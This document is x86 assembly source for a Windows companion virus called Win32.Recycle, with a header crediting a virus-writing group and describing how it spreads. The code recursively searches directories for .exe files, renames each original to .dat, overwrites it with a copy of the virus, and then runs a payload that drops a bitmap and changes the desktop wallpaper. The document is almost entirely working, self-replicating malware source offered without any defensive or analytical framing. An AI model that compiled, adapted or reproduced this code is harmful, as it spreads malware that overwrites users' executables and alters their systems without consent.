   ;Name:  Win32.Recycle
   ;Coder: BeLiAL/bcvg
   ;Type:  Companion Virus
   ;Payload: Changes Wallpaper

   ;This Virus is a rest product from me...During the last year (2001),
   ;i started some projects and stopped them (not finished). Becoz of this,
   ;some unfinished source code was on my HD. So i took it together and builded
   ;with it this virus.
   ;It searches in all its subdirs for exes, makes a dotdot, searches again
   ;for subdirs (and in the subdir for subdirs too ;)...The exefiles are copied
   ;to .dat and the virus is copied over the original file.
   ;After execution, the virus starts the original dat file, drops a bmp and changes
   ;the desktop wallpaper to it. For putting the bmp into the virus, start injector.asm
   ;after compiling win32.recycle.

   ;BeLiAL 2002

   .386
   .model flat

   EXTRN ExitProcess:Proc
   EXTRN GetCurrentDirectoryA:Proc
   EXTRN SetCurrentDirectoryA:Proc
   EXTRN MessageBoxA:Proc
   EXTRN FindFirstFileA:Proc
   EXTRN FindNextFileA:Proc
   EXTRN FindClose:Proc
   EXTRN GetModuleFileNameA:Proc
   EXTRN CopyFileA:Proc
   EXTRN WinExec:Proc
   EXTRN SetFileAttributesA:Proc
   EXTRN SystemParametersInfoA:Proc
   EXTRN CreateFileA:Proc
   EXTRN CreateFileMappingA:Proc
   EXTRN MapViewOfFile:Proc
   EXTRN CloseHandle:Proc
   EXTRN UnmapViewOfFile:Proc

   CREATE_ALWAYS       equ 2
   SPI_SETDESKWALLPAPER    equ 20
   SPIF_UPDATEINIFILE      equ 1

   .Data

   debugmodus      db 0            ;It will only infect current dir if its set!

   exestring       db "*.exe",0
   dirstring       db "*.*",0
   searchhandle1   dd 0
   searchhandle2   dd 0
   searchhandle3   dd 0
   directorybuffer db 256 dup (0)
   directorybuffer2 db 256 dup (1)
   subdirflag      db 0
   exefindertopic  db "ExeFound:",0
   dotdot          db "..",0
   lastrun         db 0

   MAX_PATH         EQU 260
   DIR_ATTRIB       EQU 10h
   FILE_ATTRIBUTE_NORMAL  EQU 00000080h

   FILETIME struct
   dwLowDateTime         DWORD   ?
   dwHighDateTime        DWORD   ?
   FILETIME ends

   WIN32_FIND_DATA struct
   dwFileAttributes      DWORD ?
   ftCreationTime        FILETIME <>
   ftLastAccessTime      FILETIME <>
   ftLastWriteTime       FILETIME <>
   nFileSizeHigh         DWORD   ?
   nFileSizeLow          DWORD   ?
   dwReserved0           DWORD   ?
   dwReserved1           DWORD   ?
   cFileName             BYTE MAX_PATH dup(?)
   cAlternate            BYTE 0eh dup(?)
   ends

   FindExeData     WIN32_FIND_DATA <>

   my_name     db 256 dup (0)
   new_name    db 260 dup (0)
               db "offset"
   bmp_file    db 1226 dup (0)
   filehandle  dd 0
   filemaphandle dd 0
   mapaddress  dd 0
   filename    db "c:\windows\picture.bmp",0

   .Code

   start:

   push offset directorybuffer
   push 256
   call GetCurrentDirectoryA

   push 256
   push offset my_name
   push 0
   call GetModuleFileNameA

   find1stfile:

   push offset FindExeData
   push offset exestring
   call FindFirstFileA
   mov dword ptr [searchhandle1],eax
   inc eax
   jz another_dir
   call infect_it

   find_nextfile:

   push offset FindExeData
   push dword ptr [searchhandle1]
   call FindNextFileA
   test eax,eax
   jz another_dir
   call infect_it
   jmp find_nextfile

   the_end:

   push dword ptr [searchhandle1]
   call FindClose

   push dword ptr [searchhandle2]
   call FindClose

   cmp byte ptr [lastrun],1
   je over_and_out

   push offset dotdot
   call SetCurrentDirectoryA
   push offset directorybuffer2
   push 256
   call GetCurrentDirectoryA
   cmp byte ptr [directorybuffer2+3],0
   je the_last_run
   jmp find1stfile

   the_last_run:
   mov byte ptr [lastrun],1
   jmp find1stfile

   over_and_out:

   push offset directorybuffer
   call SetCurrentDirectoryA

   mov eax,offset my_name

   find_hostname:

   cmp byte ptr [eax],00h
   je return_to_host
   inc eax
   jmp find_hostname

   return_to_host:

   mov dword ptr [eax-3],'tad'
   push 0
   push offset my_name
   call WinExec

   call Payload

   push 0
   call ExitProcess

   another_dir:

   cmp byte ptr [debugmodus],1
   je over_and_out

   cmp byte ptr [subdirflag],1
   jne findnewdir
   push offset dotdot
   call SetCurrentDirectoryA
   mov byte ptr [subdirflag],0
   jmp findnextdir

   findnewdir:

   push offset FindExeData
   push offset dirstring
   call FindFirstFileA
   mov dword ptr [searchhandle2],eax
   inc eax
   jz the_end
   cmp byte ptr [FindExeData.cFileName],'.'
   je findnextdir
   cmp dword ptr [FindExeData.dwFileAttributes],DIR_ATTRIB
   jne findnextdir
   push offset FindExeData.cFileName
   call SetCurrentDirectoryA
   mov byte ptr [subdirflag],1
   jmp find1stfile

   findnextdir:

   push offset FindExeData
   push dword ptr [searchhandle2]
   call FindNextFileA
   test eax,eax
   jz the_end
   cmp byte ptr [FindExeData.cFileName],'.'
   je findnextdir
   cmp dword ptr [FindExeData.dwFileAttributes],DIR_ATTRIB
   jne findnextdir
   push offset FindExeData.cFileName
   call SetCurrentDirectoryA
   mov byte ptr [subdirflag],1
   jmp find1stfile

   infect_it proc

   pushad
   mov eax,dword ptr [FindExeData.nFileSizeLow]
   cmp ax,2000h
   je exit_inf_proc

   ;push 0
   ;push offset exefindertopic
   ;push offset FindExeData.cFileName
   ;push 0
   ;call MessageBoxA

   mov ecx,260
   mov esi,offset FindExeData.cFileName
   mov edi,offset new_name
   mov eax,edi
   rep movsb

   search_file_end:

   cmp byte ptr [eax],00h
   je found_file_end
   add eax,1
   jmp search_file_end

   found_file_end:

   cmp byte ptr [eax],'.'
   je found_extension
   sub eax,1
   jmp found_file_end

   found_extension:

   mov dword ptr [eax],'tad.'

   push 0
   push offset new_name
   push offset FindExeData.cFileName
   call CopyFileA

   push FILE_ATTRIBUTE_NORMAL
   push offset FindExeData.cFileName
   call SetFileAttributesA

   push 0
   push offset FindExeData.cFileName
   push offset my_name
   call CopyFileA

   exit_inf_proc:

   popad

   ret

   endp

   Payload proc

   push 0
   push 0
   push CREATE_ALWAYS
   push 0
   push 1
   push 80000000h + 40000000h
   push offset filename
   call CreateFileA
   mov dword ptr [filehandle],eax

   push 0
   push 1226
   push 0
   push 4
   push 0
   push dword ptr [filehandle]
   call CreateFileMappingA
   mov dword ptr [filemaphandle],eax

   push 1226
   push 0
   push 0
   push 2
   push dword ptr [filemaphandle]
   call MapViewOfFile
   mov dword ptr [mapaddress],eax

   mov esi,offset bmp_file
   mov edi,dword ptr [mapaddress]
   mov ecx,1226
   rep movsb

   push dword ptr [mapaddress]
   call UnmapViewOfFile

   push dword ptr [filemaphandle]
   call CloseHandle

   push dword ptr [filehandle]
   call CloseHandle

   push SPIF_UPDATEINIFILE
   push offset filename
   push 0
   push SPI_SETDESKWALLPAPER
   call SystemParametersInfoA

   ret

   endp

   end start
